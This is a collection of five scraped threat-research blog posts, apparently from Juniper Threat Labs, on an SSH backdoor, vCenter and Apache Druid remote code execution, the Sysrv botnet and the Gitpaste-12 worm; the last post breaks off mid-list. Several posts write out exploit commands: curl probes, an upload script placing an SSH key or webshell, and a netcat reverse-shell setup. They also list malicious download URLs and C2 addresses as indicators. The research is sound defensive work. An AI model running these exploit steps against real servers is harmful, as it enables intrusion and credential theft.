{"https://blogs.juniper.net/en-us/threat-research/linux-servers-hijacked-to-implant-ssh-backdoor": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2021-04-26", "source": "blogs.juniper.net"}, "text": "O n February 1 st , Juniper Threat Labs observed an attack that attempt ed to i nject malicious code in to Secure Shell (SSH) servers on Linux. The attack begins with an exploit against the C ontrol Web Panel (CWP, formerly known as Centos Web Panel) server administration web application, injects code via LD_PRELOAD , and uses a custom, encrypted binary command-and-co ntrol protocol to exfiltrate credentials and machine capabilities. As of this writing, the malware command-and-control server is still active. Figure 1. Attack chain Exploit Th e attack starts with a command injection against Control Web Panel: Figure 2. HTTP request from initial attack CWP has been plagued by security issues, including 37 0-day vulnerabilities disclosed by the Zero Day Initiative in 2020 . Among these is a failure to sanitize the service_restart paramet er , which follows a similar set of vulnerabilities in 2018 . Because of the number of vulnerabilities in CWP, the intentional encryption and obfuscation of the ir source code ostensibly f or security reasons , and CWP ’s failure to respond to ZDI’s recent disclosures, it is difficult to ascertain which versions of CWP are or remain vulnerable to this attack. In 2020, there were over 215k CWP installations accessible from the open internet, so the number of computers compromised in this campaign may be substantial. Installation On successful exploitation of the web panel, the following commands are executed. Figure 3. Commands executed via CWP exploit First, the “sshins” installer binary is retrieved, executed, and deleted . Then the CWP logs are wiped of any mention of sshins and the shell history is cleared. The sshins binary is a 64-bit Linux ELF executable. It is packed with UPX and t he packed file has garbage bytes appended to it in an attempt to hinder automated unpacking. It does 3 things: Drops a Linux shared library to an architecture-specific location (in this case, /lib64/libs.so). Writes the name of the dropped file to a text file at /etc/ld.so.preload Restarts the OpenSSH service. Figure 4. Console output from the installer Hijacking the OpenSSH server process Injecting the malicious code The file /etc/ld.so.preload contains a directive to the dynamic linker telling it to load the specified shared library first , and to give precedence to the exported functions from the ld-preloaded library . Because the malicious libs.so library exports its own version of the bind () function, applications will use the backdoored version of this function instead of the standard implementation from Linux system libraries . When the Open-SSH server daemon ( sshd ) restarts, libs.so will first execute an initialization function as the library is loaded, and then has the ability to inject its own code whenever sshd calls bind(). The sshd server processes use this hook in order to periodically beacon to the command-and-control (C2) server and to exfiltrate data , including a listing of system information such as CPU and OS details , amount of RAM, available disk space , and OpenSSH configuration : Figure 5. Strings from the disassembled library indicating data to be exfiltrated. In addition to the continuously-ru nning server processes , sshd forks() a pair of new process es to handle each login connection . From these session-specific processes, th e malicious bind() function launches an additional temporary sshd process that exfiltrates the incoming user’s login credentials . Figure 6. User credentials and computer identifier exfiltrated by the malware. C2 communication The C2 communication involves the server 176[.]111.174.26 on port 443. Port 443 is typically used for HTTPS but here the traffic is raw TCP , hiding in plain sight on a common port. The server has a Russian IP address that is associated with a Bulgarian webhosting provider. The client initiates communication with a simple directive , padded out to 8 bytes. (As we’ll discuss below, the malware uses an encryption algorithm with an 8-byte block size, but even unencrypted messages are always a multiple of 8 in length .) Following is the first packet sent to the server after the TCP handshake, with the 8-byte message highlighted. Figure 7. Initial TCP packet to C2 server, with payload highlighted. The C2 server replies with the following message (TCP packet omitted for clarity) : Figure 8. Server response. The response consists of a header with the payload length (24 bytes), a command (0x0201), and the CRC32 checksum of the payload. The 24-byte payload is used to encrypt the exfiltrated data that i s then sent back to the C2 server , as we’ll see in the next section. Cryptography Data sent back to the C2 server is encrypted using a variant of the Blowfish encryption algorithm that was used to secure game assets on the Nin tendo and , more recently, incorp o rated into a reverse-engineering challenge from Kaspersky Lab . Below is publicly available encryption code that was reverse-engineered from the DS : Figure 9. Reverse-engineered Nintendo DS encryption routine, from https://github.com/RocketRobz/NTR_Launcher_3D/blob/master/twlnand-side/BootLoader/source/encryption.c. Then we have the decompiled encryption routine from the preloaded library: Figure 10. Corresponding encryption routine from the malware. Note, in particular, the use of the constants 0x12, 0x112, 0x212, and 0x312 , which differs from the standard Blowfish implementation. ( The decom piled code is functionally identical to the Gameboy routine, differing only due to loop-unrolling and other compiler optimizations . ) While the underlying encryption routine is taken directly from publicly available code , the malware authors incorporate some additional tricks to thwart analysis and decryption. Both Blowfish and the Nintendo variant require a n S-box lookup table that remains constant throughout the encryption and decryption processes. But u nlike the Nintendo implementation , the malware mutate s its S-box prior to use. First, as the table is loaded from program memory, it is subject to several static transformations that make it harder to correlate the stored table with the one used for encryption. Then the encryption algorithm is run against portions of its own S-box , transforming it at each step. This process is initialized using part of the 24-byte payload received from the C2 server. Once the table has been fixed, the actual encryption begins. T he malware improves upon the Nintendo implementation by adding cipher-block chaining (CBC) . With CBC, each 8-byte plaintext block is first XOR e d against the encrypted output from the previous block, and then that value is encrypted. The result is a chain where the encrypted value of each block depends on the value of the previous block. To start this process, the first block is XORed against an initialization vector (IV) . Here, the IV is itself the XOR of the first and last 8 bytes of the payload from the C2 server. Without CBC, a symmetric encryption algorith m is vulnerable to frequency analysis when the block size is small as well as other attacks in the general case. It appears that t he authors of this malware went to a surprising amount of trouble to strengthen the Nintendo DS encryption, in stark contrast to the noisy behavior of the ir sshins installer. Conclusion Without allowing our compromised test machine to remain connected to the internet and be used for malicious purposes , it’s difficult to ascertain the exact motivations of the authors. But because the malware catalogs detailed system information and credentials but does not immediately begin mining cryptocurrency or amplifying the attack by attempting to spread further, we suspect that access to the compromised machines will be sold or rented as part of a botnet. Detection The malware and C2 server used in this campaign are detected and blocked by Juniper ATP and Juniper ATP Cloud, and the malicious traffic is detected by the IDP rule SSL:VULN:CWP-LINUX-C2-BACKDOR. Figure 11. Detection on Juniper ATP Cloud IOCs 176[.]111.174.26    C2 server ab9cc4ee82aa6f57ba2a113aab905c33e278c969399db4188d0ea5942ad3bb7d  sshins (as delivered) 936ca431d17d738beab9735a3d6e658ff29f8337f52353fd60e286c94dd2c06b  sshins (unpacked by UPX, after deleting appended data) c8df513e9e4848e35af5246a2ba797540b68a9379a1df17e34550cb0258960e8  sshins (manually unpacked) f51e83a53dd3a364709b1d0b93489f7a114b529268c3bab726ed288eba036bca  /lib64/libs.so 948b6c5fc1ba74ed57388241d1e8656e0ca082d10ff834c628d01c592764926d  /lib64/libs.so 56ce53b6c32beacd8864258c81bf276304a8da20bc0011f5e09d37b95a3e5def  /lib64/libs.so b5e29bdb105ae0e76d75c3d3959954c4f6610cd39aaa8f3aa852dd624e662480  /etc/ld.so.preload"}}
{"https://blogs.juniper.net/en-us/threat-research/cve-2021-21972-vmware-vcenter-unauthorized-remote-code-execution": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2021-04-09", "source": "blogs.juniper.net"}, "text": "VMware vCenter Server is the centralized server management software for VMware, and is used to manage virtual machines, multiple ESXi hosts, and all dependent components from a single centralized location. It is widely used by e nterpri s es for their production and testing of application servers both in their local networks as well as in their hybrid cloud infrastructure . A r emote c ode e xecution v ulnerability has been recently reported in the vSphere client plugin of VMware vCenter server. It is because of i mproper validation of directory paths in the uploaded tar archive ( OVA) . This vulnerability has been assigned CVE-2021-21972. More details about CVE-2021-2 1972 and various affected versions can be found at NVD . In this blog, let’s take a close look at how this vulnerability works. Vulnerability Details : In our lab, we hosted VMware vCenter 6.5 build 1 6374 022 t o recreate the attack scenari o . Below are how the network details looks like while configuring the server : vCenter server details Below marked is the vulnerable vCenter server version : Vulnerable vCenter server Below marked is the vulnerable vCenter server build number : Vulnerable vCenter server build vSphere client is accessible through web browser : client access vSphere client plugin uses “/ ui / vropspluginui /rest/services/ uploadova ” endpoint to receive OVA files. Once an OVA file is uploaded, t he request handler method uploadOvaFile implemented in com/ vmware / vropspluginui / mvc / ServicesController .java extracts non-directory file objects from OVA to “ / tmp / unicorn_ova_dir ” folder . It parse s the f ile name from the file object header and concatenat es the extracted path to the base path without checking the f ile name for directory traversal characters such as “..”. As a result, attackers can upload malicious files to their intended locations. Although the “/ ui / vropspluginui /rest/services/ uploadova ” endpoint is supposed to be accessed only by an authenticated user, we could see that it is accessible without authentication as well. Therefore , it is combination of authentication bypass and directory traversal. We demonstrate this with below steps: Create a dummy test file-based archive: test file archive Upload the file to vulnerable server without authentication : file upload to the server Verify the uploaded test file: verifying the uploaded test file Remote Code Execution : To exploit the server, we try to do the following: Validate whether the server is vulnerable or not. If  yes, u pload a customized payload with public key or w ebshell in it. Get reverse shell by connecting from attacker machine . Get webshell by entering the w ebshell address on attacke r machine. V alidate th e vulnerability by sending below quer y to the server : $ curl – i -s -k $’https://192.168.2.143/ui/vropspluginui/rest/services/getstatus’ query to validate the server Even with an unauthorized request to / ui / vropspluginui /rest/services/*, the server responds with 200 OK. We can see that GET is not allowed, POST is allowed: $ curl – i -s -k $’https://192.168.2.143/ui/vropspluginui/rest/services/uploadova’ POST request allowed This is validated by sending the same request with POST method . $ curl – i -s -k -X $’POST’ $’https://192.168.2.143/ui/vropspluginui/rest/services/uploadova’ POST request In th e above response, it is looking for the ‘ uploadFile ’ parameter in the POST request. It means, vCenter is ready to accept the file as input . T o get the shell of the vCenter, we should get access to SSH service . It is using the ‘ vsphere-ui ’ user access permissions while uploading the file . Since it accepts the file upload, we can generate public key on the a ttacker machine and upload it to vCenter Server ’s ‘ vsphere-ui ’ user SSH direct or y and try to connect to the server via SSH using the private key , then we can achieve the shell of the vCenter server. This is how it goes: Let’s verify the SSH service is running or not, checking port 22 It is running SSH service. So, we can proceed further and generate public key on a ttacker machine. W e will generate the k ey pair : generating the key pair U pload the public key and exploit ed the vulnerability. $ python3 vmwarevcenterserver70-upload.py -u https://192.168.2.143 -f /home/ natraj /. ssh /id_rsa.pub getting the shell of the server Uploading the public key to vCenter server: captured file upload request Response from vCenter server: response from vCenter server Verifying the public key: verifying the uploaded public key This is how we reach the shell o n the vCenter server. With this user connected , an attacker can copy any files to the victim machine and execute them. We can even exploit this vulnerability and use w ebshell as payload. $ python3 vmwarevcenterserver70-upload.py -u https://192.168.2.143 -f webrce.jsp -t webshell webshell uploaded Verified the user, webshell verified. Remediation and Conclusion: Juniper Networks’ NGFW SRX customers with an IDP license are protected against compromise of this vulnerability using the signature: HTTP:CTS:VMWARE-VCENTER-RCE This signature was released immediately on 26th Feb 2021 with Out-of-Band Export #3359 and is part of the recommended template. At the same time, those affected by CVE-2021- 21972 should upgrade the vCenter server to the latest version, as advised by the vendor."}}
{"https://blogs.juniper.net/en-us/threat-research/sysrv-botnet-expands-and-gains-persistence": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2021-04-08", "source": "blogs.juniper.net"}, "text": "On March 4, 2021, Juniper Threat Labs identified a surge of activity of the Sysrv botnet. The botnet spread itself into Windows and Linux systems by exploiting multiple vulnerabilities, which we will cover in this blog. The threat actor’s objective is to install a Monero cryptominer. The attack remains active. Here’s what we’ve seen so far. Sysrv Botnet Development Juniper Threat Labs monitored the Sysrv botnet since December of 2020. At that time, it used two mining pools, minexmr and f2pool . It also used multi-component malware wherein the worm binary is installed as sysrv ( sysrv.exe on Windows) and the miner binary as network01 (network01.exe on Windows). In February 2021, we saw the botnet remove the minexmr mining pool and only use f2pool. Then, in March 2021, Juniper Threat Labs noticed a significant uptick in activity, as recorded by our sensors. In addition to incorporating more exploits, the botnet now combines the worm and the miner into a single binary. Our researchers believe the threat actor will have better control and management with a single binary as the binary is constantly updated. Sysrv also added nanopool as a new mining pool. We also identified new development in the loader script where it tries to add ssh keys to infected system. We believe this is a way for the threat actor to gain more persistence and may lead to more sophisticated attacks. Ldr.sh started adding its keys for maintaining persistence Bundled Exploits Based on our findings, the attack surged on March 4, 2021 and we identified six vulnerabilities actively exploited with a payload, including: Mongo Express RCE (CVE-2019-10758) XXL-JOB Unauth RCE XML-RPC (CVE-2017-11610) CVE-2020-16846 (Saltstack RCE) ThinkPHP RCE CVE-2018-7600 (Drupal Ajax RCE) Sysrv botnet attacks from Juniper’s sensors Mongo-Express RCE (CVE-2019-10758) The attack we’ve seen so far specifically targets port 8081, which affects a web based MongoDB admin interface known as “Mongo-Express”. Mongo-Express is a web-based admin interface used to manage MongoDB databases. Exploiting this interface could allow the attacker to gain access to the MongoDB databases. As of this writing, there are 847 public IPs in Shodan.io that are hosting this service. XXL-JOB Unauth RCE This attack targets vulnerability in XXL-Job, a lightweight distributed task scheduling framework. It allows users to schedule tasks like cron jobs via a web interface. According to the authors, this framework has been adopted by many companies in China. From Shodan, we’ve enumerated 35 public IPs with this service, almost all of them in China. xxl-job unauth rce attack XML-RPC (CVE-2017-11610) This vulnerability affects “Supervisor”, a web interface to manage processes on UNIX systems. A specially crafted XML-RPC request could allow code execution on a vulnerable server. Saltstack RCE (CVE-2020-16846) This vulnerability affects systems running Salt-API, an interface on top of Salt that provides multiple entry points to the Salt system. “This CVE affects any users running the Salt API. An unauthenticated user with network access to the Salt API can use shell injections to run code on the Salt-API using the SSH client.” -https://saltproject.io/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/ ThinkPHP RCE ThinkPHP is another PHP framework that is widely exploited by Sysrv. A quick search on Shodan shows there are more than 35,000 public IPs deploying this service. Most of them are in China. Drupal Ajax RCE (CVE-2018-7600) This vulnerability, aka “Drupalgeddon”, affects Drupal, a widely used CMS similar to WordPress. This vulnerability is relatively old but we still see many threat actors using this vulnerability. Sysrv Botnet Payload When a system is infected and becomes a bot, the bot has two functions. The first is to spread and infect more bots and the second is to mine for Monero cryptocurrency. A bot spreads itself by attacking random public IPs using the exploits we have listed above. The exploit’s payload is to download a loader script from a hard-coded IP or domain via wget, curl or powershell. The name of the script is either ldr.sh or ldr.ps1. The loader script will then download the worm and miner binary from an IP hardcoded on the loader script. The binary payload has a Linux and Windows version. It is a 64-bit Go binary which is then packed with UPX. Linux binary found on Virustotal Windows binary found on Virustotal Cryptomining Worm The cryptomining worm spreads by scanning vulnerable systems on the internet. It uses multiple exploits we have listed above. Based on the binaries we have seen and the time when we have seen them, we found that the threat actor is constantly updating its exploit arsenal. The latest addition includes an exploit targeting Laravel software, an open-source PHP web framework. sysrv malware main routine Inside the binary, we found the exploits it used to spread. Exploits include: Exploit Software CVE-2021-3129 Laravel CVE-2020-14882 Oracle Weblogic CVE-2019-3396 Widget Connector macro in Atlassian Confluence Server CVE-2019-10758 Mongo Express CVE-2019-0193 Apache Solr CVE-2017-9841 PHPUnit CVE-2017-12149 Jboss Application Server CVE-2017-11610 Supervisor (XML-RPC) Apache Hadoop Unauthenticated Command Execution via YARN ResourceManager (No CVE) Apache Hadoop Brute force Jenkins Jenkins Jupyter Notebook Command Execution (No CVE) Jupyter Notebook Server CVE-2019-7238 Sonatype Nexus Repository Manager Tomcat Manager Unauth Upload Command Execution (No CVE) Tomcat Manager WordPress Bruteforce WordPress XMRig Miner The second component of the payload is a cryptominer that mines Monero. In the early malware samples, the miner is in a separate binary. In later samples, the miner component is merged with the worm into a single binary. The miner is a version of XMRig which mines for the following mining pools: Xmr-eu1.nanopool.org:14444 f2pool.com:13531 minexmr.com:5555 As of poolwatch.io, these pools are three of the top four Monero mining pools. Combined together, they almost have 50% of the network hash rate. The threat actor’s criteria appears to be top mining pools with high reward rates. top monero mining pools The profit from mining is saved into the following wallet address: 49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa How profitable is this miner? Looking at Nanopool, this wallet gained 8 XMR (~1,700 USD) from March 1 to March 28. It appears to be ramping up recently at a pace of 1 XMR per 2 days. source: https://xmr.nanopool.org/account/49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa From f2pool, this wallet gained 10XMR from December 2020 to March 2021 (2,000 USD). source: https://www.f2pool.com/xmr/49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa Mitigation Juniper Advanced Threat Protection (ATP) Cloud detects the binary payloads as follows. ATP Cloud detection of Linux Binary ATP Cloud detection of Windows binary Indicators of Compromise Sha256, ip, URL, domain Type 8223164dd8e2c7d6b2f0da63639186564335ba6a1bfc11cf31493d5c48f3abaf linux binary 9b2023a0e22f22860a7a46a67c9eba2c4831db66244603fd961fbb5c38b55272 linux binary ba46915f06d99c4dbb9d07767a86e979893f46333a8a93fce6e040452dfc1155 linux binary 3ea2df69b99f78fc0768ecf8190293f2b277b6de6e7b8e668f40b8a4910df17c linux binary 2d5de0dfa05c2a2649a4537b3f935f3ab2c029eeb3a07ab33592611388c845aa linux binary d42090b274d285e759de296239bd7b8e5d97270b2d2ae189aed80e68ba82b591 linux binary e627aff93c1e095786b5a5248425ec62c1ea8b049d487cfa6e9cfdf2a0ddbd7b linux binary bf2c450d4d3519de51fbd31def04a0e6786e13a568ddefcaa62d812cc72ffc4c linux binary 1dd2c66843fcf5512b4dda518c2d5010edf06ab701f0380777b1b305ce9c98b0 linux binary a999d7f95af4084b1e4276ee329e9b466c4d88a14cfc87007587d18a4a6c9f8a linux binary 7a546057a47ee02f6436e51d6d61f1b63c525307f9b5076a8edfe2cf4ae68769 linux binary 6750e584ad0c21588e0add09c6ebe0cc9affe1673ac848b1761359170cf08bb7 linux binary 5f5d599d4d0f9149440a6f813c6db3759d4fdbf7abe991c3af3aa59dc8c4027f linux binary 72483800c412e2204731b12c9d8fff1bc84f7af8f0b258299bb4f091a57ab23a linux binary 9c9b7da616239290db831a9305e1a46d45c112c761deaea5ed4c36aea7433891 linux binary beaa0639a67f7fc7937a100f01a550ecb8c8b608251f4d02a97d9a0a15de1304 linux binary 7ff5f2b3145d1e54a84f5bcc13ae6838baac2d6c20951d19608166833753d96f linux binary 1c91ed47c3c0baa74fa15c9b02330701dd02fc1e9b44963e1fe9a650ef7b78ef linux binary 296d3d3ed5feeda7f6d99adc9da2566cb6c460194066acccac941a7b09bedfc3 linux binary 848ed7e90c767e7ab2b1a93f9b8ca9c41eb02c3c76bf8b7dfd806fe26c1f431e linux binary 4fd37fa6ccf027e11409e3ca3b8109b2830cb3d7842303e67e6d0c087ae1b419 linux binary 22ef90a2b3c23d3c890358fff4ec1210e4ceaaf46d8bef525294151b0e88ce15 linux binary 77a9f3d4f498c8a84e09c89fd75d98eea31954cc17d948b876c00c638c95a7b6 linux binary 5208cda8463eee0ac2cf0273dcd4036aa1e2be0de2c45b4ffd71e4c92bac3f2b linux binary 18a877f11f2ba2d7ae05ee8644a5cbd687282df4010dd0cb7680aec2e00d98ce linux binary f487b23309808e468889baf10c852284b7833b8ac06fd405d1b19abafc8e17fb linux binary 0c13b3528088c308ac28971fba93939c66da2eabef66a4d3790c0b1817221535 linux binary dd31b774397c6e22375d4f2fe26e38e82ae164bc73cf58314b18b8eed26802f0 linux binary bcb02047374196acdf0285a656a8d378cecd6115c403d0bc9f743b4e3ffd6fed linux binary 1384790107a5f200cab9593a39d1c80136762b58d22d9b3f081c91d99e5d0376 linux binary dd5b4de5a1c68aad5a2efb08db55cb3e09f8ddffc19c95c1ecf9d06c6edf2d40 linux binary 9d85b4e7202521d435a871b7de5f8affd30603687cf6e6f39f1420e9223b2bea linux binary 8353823b0dc71e1feec1a2ba5e509966d5dae7f5105489c1e628baa73b314d76 linux binary be8d067e762c5da8e616f62e882881b82c8627943bdf006e304fd9a4f784763f windows executable 588b0838cc4c0fc64bfc1e5eeab2c9a59248e4e28a859ecbbac6bfe88bda703d windows executable 5c902be344f9e089e60c36bbe3345fb5bd9c3c0b4cec349a6bb18da7faef0908 windows executable 98e10d9c5bfd7a26ff3eb68d232109b6fbe0b0ec39f763f574301fb55e52a067 windows executable 0f02a4180528a850cf24310f2e88c365695e35adbe6ba023288283599348b16d windows executable d8336694afc213433470e9481de2f5d3f57dbeaf5763f62d137be103f63c45dc windows executable 9fd4fbab33dbedf48706096ab4ae19e25648f33d2e9fba62118fea726c918848 windows executable e51e35ce9737838d1a26be7285ba78a137d11c6725382944f34bde86f16cc893 windows executable 8d0585970d1f6996ee8a034ee1f482bb0df32599e618312c0830e2fb04b6af5a windows executable 064869b60b9cdb2b39daa30280770e63d9151fe3cc9f6db3813953cd71bdba8f windows executable 4a588b7f30c91dd5603ffb0ea48cbd9f589f44b7fcb980b9bb9959d87dd344ad windows executable 15e0b4302902a425dcd0476a60a0d96a17c5a6cdd9fe13c2d09c5055e48178e4 windows executable c75c47694c5affa6c7eb4259ec3e4f29c740872305229b271e57bd90816e86b6 ldr.sh b7e06689bde2614505a70cd0b4be24688be78d05057a134cc3f16919763bf65f ldr.sh 41abb26f7c6dbc59ed4fc9f323211b4d422937700d866a7c5d12625f85fe6be6 ldr.sh a41f2f0d431e750e911fc8f70c8b764f141f19fef2e6b0b70192d502d59ae39a ldr.sh c07838598435a26f658654db4ce816914e6cfe70056382471362407d6093e1fa ldr.sh f674e83e44bbb3ddf76c3622b9b8b0be16edf60f4021a91b5959e528684c481f ldr.sh af279402867f3ef8d9e8bacde3aff359b1c6f3f2d581b914f12cb9d914199a0d ldr.sh 58d96898ae28a806c8056799d703cad8a5bac95772458512395f77b8b6f73585 ldr.sh 6cab9f43cf738ba5ca9fb519f898f6ae10b11391d76191c395fe2c5bcbe5c100 ldr.sh 6a77d927c3e749c92b3f8847804c0de509050ad24aaf72519314df9226c3acb0 ldr.sh 2d1b6deaccca69f67a6a207ecebb0010e62cd4d87298374c957236c78606f62e ldr.sh 0783a9793100e6a32b21183239f955989c8901d18260092309efae91ccc075da ldr.sh 30c3965452d35eab07243e2b193a3de678c1be6719753ed00b164785ae57ea98 ldr.sh 03e1806272242fae788c8728bc5796482890601839c0c5012855424ce253c95d ldr.sh b480b65704fb998bafa8893221e691daa906a80206196eda1ac3c0cdcc5c1c49 ldr.sh 774fad3fd2c7add5842b58c1127b9061d38027debcd3917910a8ec6b6aec9d08 ldr.sh 472fa4d13d8d71762af7fe5d574ad0d7c7c2983d228fd0944f0ee706e5b9d551 ldr.sh f36b692e27631a5cc96f705ad06fa4496b70fc59c4ed3b6f9a2efffff503975c ldr.sh 0703482c9cfd573924c028db0a2563b7e936993a345ad6d92e9cff73030cebc5 ldr.sh 8f421d90d2697cc38d24858ab894a119719a217157c151eaf9fe9ff55f6387a5 ldr.sh 752f181073449404df442a56b067951a8ed5a5419129ca5a416e80c376295b54 ldr.sh 1d42661ed8ee86d6329d27158ba9d1cf6291b1d3c6554ba50b683643f0b89959 ldr.sh f4098b2e1e861baac736ea9e71c45e488330a3f7a799460f35573014e04152c0 ldr.sh 73366b91ed479f3394fe2f211edac36df0e90d6be41b7ee0559582a324484e40 ldr.ps1 934b422f0b8d26bd1c094bd532ddd947a702262c27991d757a9a6e3672014e98 ldr.ps1 http://185[.]239.242.71/ldr.ps1 download urls http://185[.]239.242.71/ldr.sh download urls http://185[.]239.242.71/sysrv.exe download urls http://194[.]145.227.21/ldr.sh download urls http://194[.]145.227.21/sysrv download urls http://194[.]40.243.98/ldr.sh download urls http://195[.]58.39.46/asap download urls http://31[.]210.20.120/ldr.sh download urls http://31[.]210.20.120/sysrv.exe download urls http://31[.]210.20.120/sysrvv download urls http://31[.]210.20.120/sysrvv download urls http://31[.]210.20.120/sysrvv download urls http://31[.]210.20.181/ldr.sh download urls http://31[.]42.177.123/sysrv.exe download urls http://31[.]42.177.123/sysrvv download urls http://31[.]42.177.123/sysrvv download urls http://45[.]145.185.85/ldr.ps1 download urls http://45[.]145.185.85/sysrv download urls http://45[.].145.185.85/sysrv.exe download urls http://finalshell[.]nl/sysrv.exe download urls http://finalshell[.]nl/sysrvv download urls 185[.]239.242.71 IP 194[.]145.227.21 IP 194[.]40.243.98 IP 195[.]58.39.46 IP 31[.]210.20.120 IP 31[.]210.20.181 IP 31[.]42.177.123 IP 45[.]145.185.85 IP finalshell[.]nl Domain"}}
{"https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2021-03-09", "source": "blogs.juniper.net"}, "text": "Apache Druid is an open source , distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency. Druid is commonly used by enterprises to analyze real-time or historical data. It can be deployed as part of public, private or a hybrid cloud. A code execution vulnerability has been recently reported in Apache Druid that allows a remote unauthenticated user to execute arbitrary javascript code with the privileges of druid server processes. This vulnerability has been assigned CVE-2021-25646. More details about CVE-2021-25646 and various affected versions can be found at NVD . In this blog, let’s take a close look at how this vulnerability works. Vulnerability Details In our lab, we had Druid version 0.20.0 running on an Ubuntu server. Druid can ingest data from multiple sources like Apache Kafka, Amazon S3 and Hadoop, among others. It also allows importing data from the local disk and users can insert their own data while building the data store. Druid data ingest options To enter your own data, choose “ Source type ” as “ inline “ and simply enter some sample data in JSON format like so: {“isRobot”:true,”channel”:”#itsme”,”timestamp”:”2021-2-22T14:12:24.050Z”,”flags”:”sample”,”isUnpatrolled”:false,”page”:”1″,”diffUrl”:”https://google.com”,”added”:1,”comment”:”I am sample data”,”commentLength”:16,”isNew”:true,”isMinor”:false,”delta”:31,”isAnonymous”:true,”user”:”Lsjbot”, “deltaBucket”:0,”deleted”:0,”namespace”:”Main”} Sample JSON data Here is how the API request looks for this step: Sampler API For other options, you can refer to this Druid quickstart guide that provides simple steps to get you started. Once data ingestion is complete , the Druid UI looks like this: Data loaded The “ sampler “ API also provides the ability for an authenticated user to execute user defined JavaScript code to carry out certain filtering and transform operations. This functionality, though, is supposed to be used in high trust environments only and is disabled by default. A command injection vulnerability exists in vulnerable versions of Apache Druid. A remote unauthenticated user can create a specially crafted request with embedded JavaScript code that is executed, even if this feature is disabled. As a result, it can lead to command injection and remote code execution. This happens as vulnerable versions of Druid fail to validate the abnormal JSON request body with empty keys. This overrides the default configuration and allows malicious users to execute arbitrary code. While fixing this issue, Druid developers have mentioned that this vulnerability was a result of an existing bug in Jackson deserializer, a Java library that helps in converting JSON strings into Java objects. Fix for CVE-2021-25646 Remote Code Execution In this vulnerability, since any JavaScript code can be executed, the following scenario was tested: Open a random listener port on the attacker’s machine using a utility such as nc . From the attacker’s machine, send a specially crafted “ sampler “ API request with JSON data containing malicious JavaScript code that connects back to the above port with the shell . As a consequence, a reverse shell is created with the Druid user privilege level. Opening port on attacker: open port with nc Sending JSON body in “ sampler “ API using curl: Malicious JSON body Sending via curl Achieving reverse shell capability on the listener port: Reverse shell This is how the malicious API request looks like : Malicious sampler API Remediation and Conclusion Juniper Networks’ NGFW SRX customers with an IDP license are protected against this vulnerability using the signature: HTTP:APACHE:DRUID-CMD-INJ This signature was released on 23rd Feb 2021 with Export #3358 and is part of the recommended template. At the same time, those affected by CVE-2021-25646 should upgrade Apache Druid to the latest stable version, as advised by the vendor."}}
{"https://blogs.juniper.net/en-us/threat-research/everything-but-the-kitchen-sink-more-attacks-from-the-gitpaste-12-worm": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-12-14", "source": "blogs.juniper.net"}, "text": "In November, Juniper Threat Labs documented a new wormable cryptomining campaign dubbed Gitpaste-12 . The initial wave of Gitpaste-12 attacks was last seen on October 27, when the GitHub repository hosting the bulk of the worm’s payloads was removed. On November 10, we discovered a new round of attacks: Network traffic from the new attacks The wave of attacks used payloads from yet another GitHub repository, which contained a Linux cryptominer (“ls”), a list of passwords for brute-force attempts (“pass”) and a statically linked Python 3.9 interpreter of unknown provenance. GitHub repository hosting malicious files In addition, two more files were added during the course of this research: a configuration file for a Monero cryptomining program (“config.json”) and a UPX-packed local privilege escalation exploit for x86_64 Linux systems (“root_x86_64”). The config file uses the Monero address 41qALJpqLhUNCHZTMSMQyf4LQotae9MZnb4u53JzqvHEWyc2i8PEFUCZ4TGL9AGU34ihPU8QGbRzc4FB2nHMsVeMHaYkxus, the same used in the October attacks. Cryptominer configuration file In this blog, we’ll dig deeper into some newly-found samples from the initial attack repository. The first, called X10-unix, is a UPX-packed binary written in the Go programming language, compiled for x86_64 Linux systems. Overview of attack The sample begins by downloading a selection of payloads from the now-defunct repository: http://raw.githubusercontent.com/cnmnmsl-001/-/master/shadu1 http://raw.githubusercontent.com/cnmnmsl-001/-/master/base64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/sudob64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/X11-unix http://raw.githubusercontent.com/cnmnmsl-001/-/master/config.json http://raw.githubusercontent.com/cnmnmsl-001/-/master/X10-unixb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/X10-unix.exeb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/X10-unix_mipsb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/X10-unix_armb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/ssb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/ss.exeb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/ss_mipsb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/ss_armb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/hideb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/hide_armb64 http://raw.githubusercontent.com/cnmnmsl-001/-/master/mipsld.so The ‘b64’ suffix indicates a file that has been base-64 encoded into an ASCII text file for use as an exploit payload. We can see that X10-unix is cross-platform, with versions for MIPS and ARM Linux machines, as well as Windows. The worm then commences a wide-ranging series of attacks comprising at least 31 known vulnerabilities — seven of which were also seen in the previous Gitpaste-12 sample — as well as attempts to compromise open Android Debug Bridge connections and existing malware backdoors. The attacks target web applications, IP cameras, routers and more. FuelCMS attack The exploits include: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1871 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3313 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8361 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17215 